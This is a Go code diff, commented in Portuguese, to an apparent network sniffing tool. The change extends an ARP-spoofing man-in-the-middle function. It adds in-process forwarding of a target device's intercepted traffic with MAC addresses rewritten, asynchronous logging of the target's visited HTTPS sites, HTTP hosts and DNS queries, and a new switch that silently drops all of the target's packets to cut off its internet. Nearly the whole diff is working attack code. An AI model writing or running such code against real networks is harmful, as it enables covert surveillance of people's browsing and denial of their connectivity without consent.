@@ -10,6 +10,7 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
+	"bytes"
 
 	"github.com/gabrifranca/cli_ping/internal/report"
 
@@ -27,8 +28,8 @@ func NewSnifferService() *SnifferService {
 
 // Estrutura para armazenar dados e gerar um relatório ao final
 type SnifferLogs struct {
-	TotalPackets     int
-	TotalBytes       int
+	TotalPackets     int64
+	TotalBytes       int64
 	DiscoveredHosts  map[string]string         // Mapeamento de IP para Endereço MAC
 	DNSQueries       map[string]map[string]int // Domínio -> IP Solicitante -> Contagem
 	TCPFlagsCounter  map[string]int            // Contagem de Flags TCP ("SYN", "FIN", etc.)
@@ -173,8 +174,8 @@ func (s *SnifferService) SniffNetwork(ctx context.Context) error {
 			packet := gopacket.NewPacket(data, handle.LinkType(), gopacket.Default)
 
 			// Incrementa estatísticas gerais
-			logs.TotalPackets++
-			logs.TotalBytes += len(data)
+			atomic.AddInt64(&logs.TotalPackets, 1)
+			atomic.AddInt64(&logs.TotalBytes, int64(len(data)))
 
 			var srcIP, dstIP string
 			var srcMAC string
@@ -447,7 +448,8 @@ func (s *SnifferService) SniffNetwork(ctx context.Context) error {
 // Isso força o tráfego do alvo a passar pela nossa máquina, permitindo
 // a captura de TTL, SNI, DNS e outros dados mesmo de máquinas em Modo Furtivo.
 // O parâmetro showLogs controla a exibição em tempo real dos logs de interceptação no terminal.
-func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, showLogs *atomic.Bool) error {
+// O parâmetro isBlocked, quando ativo, diz ao sniffer para destruir os pacotes e bloquear a internet do alvo.
+func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, showLogs *atomic.Bool, isBlocked *atomic.Bool) error {
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
 		log.Println("  [-] Erro ao buscar interfaces:", err)
@@ -543,12 +545,10 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 	}
 	fmt.Printf("      Alvo MAC:    %s\n", targetMAC.String())
 
-	// Ativa IP Forwarding para não derrubar a internet do alvo
-	fmt.Printf("  [*] Ativando IP Forwarding...\n")
-	if err := enableIPForwarding(); err != nil {
-		fmt.Printf("  [!] Aviso: Não foi possível ativar IP Forwarding automaticamente: %v\n", err)
-		fmt.Printf("  [!] O tráfego do alvo pode ser interrompido. Considere ativar manualmente.\n")
-	}
+	// Removemos a ativação do IP Forwarding do SO!
+	// Dependeremos exclusivamente do nosso Software Forwarding (Zero-Allocation)
+	// Isso evita conflitos de ICMP Redirect e bypassa restrições locais de roteamento.
+	fmt.Printf("  [*] Utilizando Zero-Allocation Software Forwarding interno.\n")
 
 	// Abre o handle para injeção de pacotes ARP
 	poisonHandle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
@@ -594,7 +594,13 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 		}
 	}()
 
-	// Goroutine 2: Captura e analisa o tráfego interceptado
+	// Configuração extrema de performance para a captura (evita lag)
+	err = captureHandle.SetBPFFilter(fmt.Sprintf("host %s", targetIP))
+	if err != nil {
+		fmt.Printf("  [!] Aviso: Não foi possível aplicar Filtro BPF na captura: %v\n", err)
+	}
+
+	// Goroutine 2: Captura e encaminha o tráfego instantaneamente (Fast Path)
 	go func() {
 		for {
 			select {
@@ -606,109 +612,183 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 					continue
 				}
 
-				packet := gopacket.NewPacket(data, captureHandle.LinkType(), gopacket.Default)
+				// ======== ZERO-ALLOCATION SOFTWARE FORWARDING ========
+				// Manipulamos o slice de bytes "raw" diretamente sem criar estruturas gopacket
+				// Data[0:6] = DstMAC | Data[6:12] = SrcMAC
 
-				// Filtra: só nos interessa tráfego DO ou PARA o alvo
-				netLayer := packet.NetworkLayer()
-				if netLayer == nil {
-					continue
-				}
-				srcIP := netLayer.NetworkFlow().Src().String()
-				dstIP := netLayer.NetworkFlow().Dst().String()
-
-				if srcIP != targetIP && dstIP != targetIP {
-					continue
-				}
-
-				logsMu.Lock()
-				logs.TotalPackets++
-				logs.TotalBytes += len(data)
-
-				// Captura MAC
-				var srcMAC string
-				if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
-					eth, _ := ethLayer.(*layers.Ethernet)
-					srcMAC = eth.SrcMAC.String()
-				}
-
-				// Captura TTL (o dado mais precioso do MitM!)
-				if ipv4Layer := packet.Layer(layers.LayerTypeIPv4); ipv4Layer != nil {
-					ipv4, _ := ipv4Layer.(*layers.IPv4)
-					ttl := ipv4.TTL
-					if srcIP == targetIP && ttl > 5 {
-						ipDestino := net.ParseIP(dstIP)
-						if ipDestino != nil && !ipDestino.IsMulticast() {
-							if currentTTL, exists := logs.HostTTL[srcIP]; !exists || ttl > currentTTL {
-								logs.HostTTL[srcIP] = ttl
-							}
-						}
+				if len(data) > 14 { // Garantir que temos um cabeçalho Ethernet
+					// Se o bloqueio total (Negar WiFi) estiver ativo, descarta tudo silenciosamente.
+					if isBlocked != nil && isBlocked.Load() {
+						continue
 					}
-				}
 
-				// Associa MAC
-				if srcIP == targetIP && srcMAC != "" {
-					logs.DiscoveredHosts[srcIP] = srcMAC
-				}
+					// Filtrar Echoes: Ignorar pacotes que nós mesmos acabamos de injetar
+					if bytes.Equal(data[6:12], myMAC) {
+						continue
+					}
 
-				// Captura SNI (HTTPS) e HTTP Host
-				if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
-					tcp, _ := tcpLayer.(*layers.TCP)
-					dstPort := tcp.DstPort.String()
+					var forwarded bool
+					isTargetSrc := bytes.Equal(data[6:12], targetMAC)
+					isGatewaySrc := bytes.Equal(data[6:12], gatewayMAC)
 
-					if srcIP == targetIP {
-						// Captura SNI em HTTPS
-						if dstPort == "443" && len(tcp.Payload) > 0 {
-							sni := parseTLSSNI(tcp.Payload)
-							if sni != "" {
-								if logs.HostAccesses[srcIP] == nil {
-									logs.HostAccesses[srcIP] = make(map[string]int)
-								}
-								logs.HostAccesses[srcIP][sni]++
-								if showLogs != nil && showLogs.Load() {
-									fmt.Printf("  [MitM] %s → HTTPS: %s\n", srcIP, sni)
-								}
+					// Pacote vindo do Alvo para fora (roteamento -> Gateway)
+					if isTargetSrc && bytes.Equal(data[0:6], myMAC) {
+						// === TRACER ICMP ===
+						// Verifica se é um pacote IPv4 (0x0800) e protocolo ICMP (1) para printar sem gerar parsing caro na rede
+						if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && data[23] == 1 {
+							if showLogs != nil && showLogs.Load() {
+								fmt.Println("  [TRACER] 1. Recebi PING do Alvo (Target -> Attacker)")
 							}
 						}
 
-						// Captura Host em HTTP
-						if dstPort == "80" && len(tcp.Payload) > 0 {
-							host := parseHTTPHost(tcp.Payload)
-							if host != "" {
-								if logs.HostAccesses[srcIP] == nil {
-									logs.HostAccesses[srcIP] = make(map[string]int)
+						// Modifica in-place
+						copy(data[0:6], gatewayMAC) // Novo Destino: Gateway
+						copy(data[6:12], myMAC)     // Nova Origem: Nós
+						_ = captureHandle.WritePacketData(data)
+						
+						if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && data[23] == 1 {
+							if showLogs != nil && showLogs.Load() {
+								fmt.Println("  [TRACER] 2. Encaminhei PING para Roteador (Attacker -> Gateway)")
+							}
+						}
+						forwarded = true
+					} else if isGatewaySrc && bytes.Equal(data[0:6], myMAC) { 
+						// Pacote voltando da Internet (Gateway) para o Alvo
+						
+						// === TRACER ICMP ===
+						if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && data[23] == 1 {
+							if showLogs != nil && showLogs.Load() {
+								fmt.Println("  [TRACER] 3. Recebi RESPOSTA do Roteador (Gateway -> Attacker)")
+							}
+						}
+
+						// O Gateway manda para nós (porque envenenamos a tabela dele).
+						// Verificamos o IP de destino para confirmar se não é o nosso próprio tráfego.
+						packet := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.NoCopy)
+						if netLayer := packet.NetworkLayer(); netLayer != nil {
+							if netLayer.NetworkFlow().Dst().String() == targetIP {
+								copy(data[0:6], targetMAC) // Novo Destino: Alvo
+								copy(data[6:12], myMAC)    // Nova Origem: Nós
+								_ = captureHandle.WritePacketData(data)
+								
+								if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && data[23] == 1 {
+									if showLogs != nil && showLogs.Load() {
+										fmt.Println("  [TRACER] 4. Devolvi RESPOSTA para Alvo (Attacker -> Target) [ROTA OK]")
+									}
 								}
-								logs.HostAccesses[srcIP][host]++
-								if showLogs != nil && showLogs.Load() {
-									fmt.Printf("  [MitM] %s → HTTP: %s\n", srcIP, host)
-								}
+								forwarded = true
 							}
 						}
 					}
-				}
 
-				// Captura DNS
-				if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
-					dns, _ := dnsLayer.(*layers.DNS)
-					if dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && srcIP == targetIP {
-						dnsQuery := string(dns.Questions[0].Name)
-						if logs.HostAccesses[srcIP] == nil {
-							logs.HostAccesses[srcIP] = make(map[string]int)
-						}
-						logs.HostAccesses[srcIP][dnsQuery]++
+					if forwarded {
+						atomic.AddInt64(&logs.TotalPackets, 1)
+						atomic.AddInt64(&logs.TotalBytes, int64(len(data)))
 
-						// Detecção de OS via Captive Portal
-						dnsLower := strings.ToLower(dnsQuery)
-						if detectedOS, match := captivePortalDomains[dnsLower]; match {
-							logs.HostOSByDNS[srcIP] = detectedOS
-						}
+						// ======== ANÁLISE ASSÍNCRONA ========
+						// Faz uma cópia rápida do slice para a goroutine usar livremente
+						pktDataCopy := make([]byte, len(data))
+						copy(pktDataCopy, data)
 
-						if showLogs != nil && showLogs.Load() {
-							fmt.Printf("  [MitM] %s → DNS: %s\n", srcIP, dnsQuery)
-						}
+						go func(pktData []byte) {
+							// Cria o packet na goroutine para evitar gargalo no loop principal
+							pkt := gopacket.NewPacket(pktData, layers.LayerTypeEthernet, gopacket.Default)
+
+							netLayer := pkt.NetworkLayer()
+							if netLayer == nil {
+								return
+							}
+							sIP := netLayer.NetworkFlow().Src().String()
+							dIP := netLayer.NetworkFlow().Dst().String()
+							
+							var srcMAC string
+							if ethLayer := pkt.Layer(layers.LayerTypeEthernet); ethLayer != nil {
+								eth, _ := ethLayer.(*layers.Ethernet)
+								srcMAC = eth.SrcMAC.String()
+							}
+
+							var pendingLogs []string
+
+							logsMu.Lock()
+
+							if ipv4Layer := pkt.Layer(layers.LayerTypeIPv4); ipv4Layer != nil {
+								ipv4, _ := ipv4Layer.(*layers.IPv4)
+								ttl := ipv4.TTL
+								if sIP == targetIP && ttl > 5 {
+									ipDestino := net.ParseIP(dIP)
+									if ipDestino != nil && !ipDestino.IsMulticast() {
+										if currentTTL, exists := logs.HostTTL[sIP]; !exists || ttl > currentTTL {
+											logs.HostTTL[sIP] = ttl
+										}
+									}
+								}
+							}
+
+							if sIP == targetIP && srcMAC != "" {
+								logs.DiscoveredHosts[sIP] = srcMAC
+							}
+
+							if tcpLayer := pkt.Layer(layers.LayerTypeTCP); tcpLayer != nil {
+								tcp, _ := tcpLayer.(*layers.TCP)
+								dPort := tcp.DstPort.String()
+
+								if sIP == targetIP {
+									if dPort == "443" && len(tcp.Payload) > 0 {
+										sni := parseTLSSNI(tcp.Payload)
+										if sni != "" {
+											if logs.HostAccesses[sIP] == nil {
+												logs.HostAccesses[sIP] = make(map[string]int)
+											}
+											logs.HostAccesses[sIP][sni]++
+											if showLogs != nil && showLogs.Load() {
+												pendingLogs = append(pendingLogs, fmt.Sprintf("  [MitM] %s → HTTPS: %s\n", sIP, sni))
+											}
+										}
+									}
+
+									if dPort == "80" && len(tcp.Payload) > 0 {
+										host := parseHTTPHost(tcp.Payload)
+										if host != "" {
+											if logs.HostAccesses[sIP] == nil {
+												logs.HostAccesses[sIP] = make(map[string]int)
+											}
+											logs.HostAccesses[sIP][host]++
+											if showLogs != nil && showLogs.Load() {
+												pendingLogs = append(pendingLogs, fmt.Sprintf("  [MitM] %s → HTTP: %s\n", sIP, host))
+											}
+										}
+									}
+								}
+							}
+
+							if dnsLayer := pkt.Layer(layers.LayerTypeDNS); dnsLayer != nil {
+								dns, _ := dnsLayer.(*layers.DNS)
+								if dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && sIP == targetIP {
+									dnsQuery := string(dns.Questions[0].Name)
+									if logs.HostAccesses[sIP] == nil {
+										logs.HostAccesses[sIP] = make(map[string]int)
+									}
+									logs.HostAccesses[sIP][dnsQuery]++
+
+									dnsLower := strings.ToLower(dnsQuery)
+									if detectedOS, match := captivePortalDomains[dnsLower]; match {
+										logs.HostOSByDNS[sIP] = detectedOS
+									}
+
+									if showLogs != nil && showLogs.Load() {
+										pendingLogs = append(pendingLogs, fmt.Sprintf("  [MitM] %s → DNS: %s\n", sIP, dnsQuery))
+									}
+								}
+							}
+
+							logsMu.Unlock()
+
+							for _, msg := range pendingLogs {
+								fmt.Print(msg)
+							}
+						}(pktDataCopy)
 					}
 				}
-
-				logsMu.Unlock()
 			}
 		}
 	}()
@@ -728,9 +808,8 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 		time.Sleep(200 * time.Millisecond)
 	}
 
-	// Desativa IP Forwarding
+	// Desativa IP Forwarding (se estava ativo por engano fora do MitM)
 	disableIPForwarding()
-	fmt.Printf("  [✓] IP Forwarding desativado.\n")
 
 	// Gera relatório
 	logsMu.Lock()
